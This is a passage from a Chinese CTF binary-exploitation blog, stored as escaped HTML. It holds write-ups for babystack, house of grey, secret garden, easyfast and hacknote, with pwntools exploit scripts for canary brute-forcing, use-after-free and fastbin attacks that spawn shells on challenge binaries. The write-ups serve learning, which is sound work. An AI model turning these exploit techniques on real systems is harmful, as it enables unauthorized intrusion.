class=\"string\">&quot;n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["STACK"]},{"title":"pawnable - babystack","url":"/2022/05/18/week12_3.1_pawnable_babystack/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-TcUlWdGy\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-18%20%E4%B8%8A%E5%8D%8811.53.50.png\" alt=\"截屏2022-05-18 上午11.53.50\"></p>\n<p>​        全绿的栈题。</p>\n<h1><span id=\"reverse\">reverse</span></h1><p>​         有了上一次的经验就知道这个题的前面的随机数也是canary了。</p>\n<p>​        所以在略过一些目前看似没有必要的代码之后，整个程序的逻辑大致如下“</p>\n<p>​        输密码，密码是一个空字节。</p>\n<p>​        然后每次可以copy 63 字节的东西,到64字节的char数组中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Copy :&quot;</span>);</span><br><span class=\"line\">sub_CA0(src, <span class=\"number\">63LL</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(a1, src);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;It is magic copy !&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​        栈的情况如下，比较清晰</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-18%20%E4%B8%8B%E5%8D%8812.20.51.png\" alt>        </p>\n<p><code>0x00007fffffff0a33</code>是一个指向0的指针。</p>\n<p>​        让我比较疑惑的就是，理论上程序对输入做了限制，那么只有63个字节能被输入，但是这里可以输入将近80个字节，并且会自动跳过canary。</p>\n<p>​        就像这样：</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-18%20%E4%B8%8B%E5%8D%8812.32.29.png\" alt=\"截屏2022-05-18 下午12.32.29\"></p>\n<p>​        然后我发现一个比较恐怖的问题，这个题没有打印。栈题的no leak，且是full</p>\n<p>relro，意味着不能改got，也不能ret2dl。</p>\n<p>​        突然想到，既然是copy，那么就可以控制输入用原来的buf上的地址覆盖。研究一下。</p>\n<p>​        这里我们想要覆盖返回地址，也就是<code>0x7fffffffe518</code>，我们copy 的起始地址是<code>0x7fffffffe4b0</code>，中间有0x68个字节，src的起始buf是<code>0x7fffffffe420</code>，对应加上偏移的地址是<code>0x7fffffffe488</code>，值是<code>0x0000555555400b70</code></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-18%20%E4%B8%8B%E5%8D%8812.49.38.png\" alt=\"截屏2022-05-18 下午12.49.38\"></p>\n<p>​            这里又出现了问题。现在我们输入了63个a在src中，一切看起来都很正常。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-18%20%E4%B8%8B%E5%8D%8812.50.40.png\" alt=\"截屏2022-05-18 下午12.50.40\"></p>\n<p>​        但是当输入64个a。之前明明是src的地方又变成了奇怪的内容。我们重新来看一下这个输入的函数。当我们读入第63个字符时，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">result = a1[len - <span class=\"number\">1</span>];<span class=\"meta\">#result = src[62]</span></span><br></pre></td></tr></table></figure>\n<p>​        如果第62个字节不是空字节，那么函数设置的“将回车替换为空字节”的操作就不生效。也就是字符串是没有空字节截断的。</p>\n<p>​        然而在strcpy中copy的实际上是带有空字节的字符串，所有空字节前所有的字符都会被copy。但是这并不能解释“只要我们多输入一个字符，src就会被清空”</p>\n<p>​        现在的状况就是，我们无法只是通过输入63个字节进入src控制copy更多的地址到返回地址上，因为src也存在很多截断的空字节。并且对应的地址似乎也不是合法的返回地址。</p>\n<p>​        但是不意味着这个思路行不通，我们可以再研究一下。</p>\n<p>​        手贱去看了wp，发现利用的过程比我想象得要复杂一些，而且果然有我没有看出的漏洞点。同样的，是我需要想到，但是最终没有想到的点，就是login函数和copy函数进入时栈帧指针并没有变化，而变量在栈上的位置也是相同的，于是就可以通过在login中输入，再在copy中完成溢出。然而这样就意味着我们不能再直接通过空字节绕过密码的验证了。</p>\n<p>​        那么只能爆破出来了。这里的密码也就是程序生成的canary，所以不管怎么样都是需要爆破的。</p>\n<p>​        其实暴力破解这个思路我目前来说都是很少使用的，我个人并不是很喜欢爆破，主要docker的性能确实比较差，但是人总归是要进步的。</p>\n<p>​        大概讲下爆破的原理吧，其实很简单，就是利用login的<code>strcmp</code>,每次输入一个字节+空字节，就相当于逐个字节比较。</p>\n<p>​        借鉴一下别的师傅的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">blast</span>(<span class=\"params\"><span class=\"built_in\">len</span>,s1 = <span class=\"string\">b&#x27;&#x27;</span></span>):</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">1</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> i == <span class=\"number\">10</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\t\ts2 = s1 + <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">\t\t\tlogin(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span> + <span class=\"string\">b&#x27;1&#x27;</span>+ <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x7</span> + s2 + <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;Success&quot;</span> <span class=\"keyword\">in</span> p.recv():</span><br><span class=\"line\">\t\t\t\ts1 = s2</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+]found!&quot;</span>)</span><br><span class=\"line\">\t\t\t\tp.recvuntil(<span class=\"string\">&quot;&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\t\t\t\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\t\t\t\tsleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(s2) == length:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s1</span><br></pre></td></tr></table></figure>\n<p>这道题确实是有学到东西的，就是爆破。以后遇到类似strcmp的时候就可以尝试了。</p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["STACK"]},{"title":"攻防世界 - house of grey","url":"/2022/05/20/week12_5_pawnable_house_of-grey/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-lkVAlbPl\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p>​        最近事情比较多，一般来说五月底的事情都很多，这个学期尤为严重。自己做的话一天一题基本不可能了，这里就大致学习一下思路吧。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-20%20%E4%B8%8B%E5%8D%883.11.48.png\" alt=\"截屏2022-05-20 下午3.11.48\"></p>\n<p>​        依旧是全绿。</p>\n<p>​        并且似乎是没有libc的，这个应该是攻防世界上的题。还是18年国赛半决赛捏。</p>\n<h1><span id=\"reverse\">reverse</span></h1><p>​        程序的大致逻辑其实比较简单。首先还是随机划分一个巨大的空间，然后clone一个进程    。进程中实现了一个类似see the file一样的文件的打开和读取功能，但是程序有沙箱保护。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-20%20%E4%B8%8B%E5%8D%884.04.48.png\" alt=\"截屏2022-05-20 下午4.04.48\"></p>\n<p>​        fn函数中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">buf[(read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x28</span>uLL) - <span class=\"number\">1</span>)] = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<p>​        可以溢出4个字节。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-20%20%E4%B8%8B%E5%8D%884.10.27.png\" alt=\"截屏2022-05-20 下午4.10.27\"></p>\n<p>​        我们看一下这四个字节溢出到哪里去了。</p>\n<p>​        buf和这个v8正好相邻，而v8是:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-20%20%E4%B8%8B%E5%8D%884.11.11.png\" alt=\"截屏2022-05-20 下午4.11.11\"></p>\n<p>​        所以只要我们覆盖v8的指针，这里就可以进行一个任意地址写。</p>\n<p>​        ps：我关闭了地址随机化。</p>\n<p>​        然而由于开启了随机化，我们需要leak地址。</p>\n<p>​        这里就是整个题目最核心的trick，由于我们可以任意读写文件，所以我们可以查看<code>/proc/self/maps</code>来获取进程的libc基地址以及其他地址</p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-20%20%E4%B8%8B%E5%8D%884.36.30.png\" alt=\"截屏2022-05-20 下午4.36.30\"></p>\n<p>​                这样就可以非常简单轻松地拿到libc了</p>\n<p>​                于是我们希望将一个返回地址任意地址写为rop链，然而注意到fn函数退出并没有返回，而是直接exit（0）了。所以我们需要用别的函数返回地址覆盖。</p>\n<p>​        比如说我们可以用read函数,那么要获得read的返回地址，我们只有stack的基地址，似乎不太够，因为stack是mmap出的一个巨大的空间，而每次读取内容只能读取0x100000大小的数据，全部读完需要100次，无论如何都没有办法一次性读出来，所以就只能分段找。我们可以在输入的时候加一个标志，然后利用循环找出我们的栈地址。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-20%20%E4%B8%8B%E5%8D%884.47.35.png\" alt=\"截屏2022-05-20 下午4.47.35\"></p>\n<p>​        找到read 的ret地址以后的操作就比较简单了，直接覆盖为rop链就好了。</p>\n<p>​    pps：这里用seccomp保护了，但是问题不大，常规orw就行。我个人感觉这题比较简单（当然是知道proc的情况下）写这么点主要是因为我现在心态有点浮躁，静不下心来，并且也不太愿意花时间再做栈题了。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["STACK - ROP"]},{"title":"pwnable - secret garden(tbc)","url":"/2022/05/21/week12_6_pwnable_secret_garden/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-CSHXbsyJ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-21%20%E4%B8%8B%E5%8D%883.23.18.png\" alt=\"截屏2022-05-21 下午3.23.18\"></p>\n<h1><span id=\"reverse\">reverse</span></h1><p>​        依旧是比较传统的菜单，这个应该不会还是栈题了吧。</p>\n<h2><span id=\"add\">add</span></h2><p>​        相对比较清晰，malloc使用的是size[0]，这个值是可以自己控制的，但是也不排除有溢出的可能性。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-21%20%E4%B8%8B%E5%8D%883.56.49.png\" alt=\"截屏2022-05-21 下午3.56.49\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-21%20%E4%B8%8B%E5%8D%883.55.02.png\" alt=\"截屏2022-05-21 下午3.55.02\"></p>\n<p>​        后面则是将flower的ptr插入到head中。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-21%20%E4%B8%8B%E5%8D%884.25.22.png\" alt=\"截屏2022-05-21 下午4.25.22\"></p>\n<h2><span id=\"show\">show</span></h2><p>​        没啥特别的，就是打印出来。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-21%20%E4%B8%8B%E5%8D%884.27.58.png\" alt=\"截屏2022-05-21 下午4.27.58\"></p>\n<h2><span id=\"free\">free</span></h2><p>这里有可能有溢出，并且有uaf</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-21%20%E4%B8%8B%E5%8D%884.49.45.png\" alt=\"截屏2022-05-21 下午4.49.45\"></p>\n<h2><span id=\"free2\">free2</span></h2><p>也是free，但是这里是free了head【0】</p>\n<h1><span id=\"利用\">利用</span></h1><p>​        2.23+uaf。感觉是比较明显的fastbin attack。</p>\n<p>​        leak的话应该也是用比较传统的unsorted bin leak的那一套，先创造一个unsorted bin，然后free leak。用一个师傅的话来说就是，无聊堆题。</p>\n<p>​        最近确实不是非常想做题，，，做点pwncollege换一下心情吧。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - Fastbin Attack"]},{"title":"wustctf2020_easyfast","url":"/2022/03/15/week3-1.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-AnROjqfW\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>2022-3-15</p>\n<h4><span id=\"wustctf2020_easyfast\">wustctf2020_easyfast</span></h4><p>checksec :</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.39.36.png\" alt=\"截屏2022-03-15 下午3.39.36\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.47.23.png\" alt=\"截屏2022-03-15 下午3.47.23\"></p>\n<p>​        简单逆向一下，有后门函数，当这个地址上储存的数小于等于0时getshell。整体的程序的话是一个没什么特别的菜单，free处有uaf，edit处能对堆指针任意写。</p>\n<p>​        首先逆向以后大体的思路是利用这个UAF进行<code>0x602090</code>的地址处的覆盖。</p>\n<p>​        所以我们需要构造chunk pointer为0x602080的fake chunk，使得对应的用户空间可以被写为0。这里就可以用到edit的任意写功能，将某个chunk的fd覆盖为0x602080，使得下一次申请到该地址的chunk。</p>\n<p>​        首先add再free两个chunk。</p>\n<p>稍微有一个要注意的就是<img src=\"file:///Users/rin/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%889.38.49.png?lastModify=1647351509\" alt=\"截屏2022-03-15 下午9.38.49\"></p>\n<p>这个地址是我们fake chunk的size位，也就是说明这个chunk申请时应该为0x40。也就是所有chunk都应该是0x40大小。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<p>​        然后再将此时先被free的chunk的fd覆盖为0x602080</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%888.43.43.png\" alt=\"截屏2022-03-15 下午8.43.43\"></p>\n<p>​        此时连续add三个chunk，第三个就是我们需要的地址了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">27982</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = process([<span class=\"string\">&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./wustctf2020_easyfast&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/64/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cmd</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;choice&gt;&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&gt;&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&gt;&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,content</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&gt;&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\">    </span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0x602080</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&quot;choice&gt;\\n&quot;</span>,<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"总结\">总结</span></h4><p>​        其实没有什么好总结的，这算是最水的一类堆题了，纯粹是太久没有做复健一下，一晚上能做三四道。</p>\n","categories":["Binary_security"],"tags":["UAF"]},{"title":"lab 10 hacknote","url":"/2022/03/15/week3-1.2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-UlZtrzvZ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>​        这个题已经做过好多遍了orz，因为不断的摆烂然后复健…..每次又是做这道</p>\n<p>​        逆一下。</p>\n<p>​        话说可以总结一下类似的题目的快速逆向方法。比如说一般肯定会定义一个结构体，结构体中包含比如content和指针的字段，然后如果有可以利用的uaf或者double free的话，就可以覆盖结构体中保存的指针字段，从而进一步攻击。</p>\n<p>​        回到这道题，这里的结构体包含两个字段，一个是<code>print_note_content</code>这个函数的地址，另外一个是结构体的content。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8A%E5%8D%8810.51.14.png\" alt=\"截屏2022-03-16 上午10.51.14\"></p>\n<p>随便申请一个note，chunk布局长这样（因为是32位的程序，所以显示上有些bug，但不影响）</p>\n<p>​        0x804865b就是<code>print_note_content</code>函数的地址，然后前面一个估计是堆上的地址。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(&amp;notelist + v1) )</span><br><span class=\"line\">  (*(<span class=\"keyword\">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure>\n<p>​            接着如果put note，这个print函数就会调用这个<code>print note</code>字段。所以利用思路就是利用UAf然后修改chunk中<code>print note</code>字段的地址为<code>magic()</code>的地址，然后再尝试puts此chunk，就相当于调用了<code>magic()</code>。</p>\n<p>​        但是由于程序并没有直接给出edit的功能，我们需要想办法在合适位置构建fake chunk，使得chunk的print字段正好处于我们可以任意写入内容的fake chunk的content字段。</p>\n<p>​        需要注意的就是free note的过程是分别按顺序先释放content chunk再释放put chunk，并且两个chunk的size不同，fastbin链表的种类也不同，分配的顺序也不同。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./hacknote&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./&#x27;)</span></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Note size :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">put</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#main_arena  0x10:=&gt; chunk1_print(0x10) </span></span><br><span class=\"line\"><span class=\"comment\">#            0x20:=&gt; chunk1_content(0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#main_arena  0x10:=&gt; chunk0_print(0x10) =&gt; chunk1_print(0x10) </span></span><br><span class=\"line\"><span class=\"comment\">#            0x20: =&gt; chunk0_content(0x20)=&gt; chunk1_content(0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">fastbin:</span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) </span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p32(magic)*<span class=\"number\">2</span>)<span class=\"comment\">#chunk2, point to chunk0_print(0x10) and chunk1_print(0x10)</span></span><br><span class=\"line\">put(<span class=\"number\">1</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span 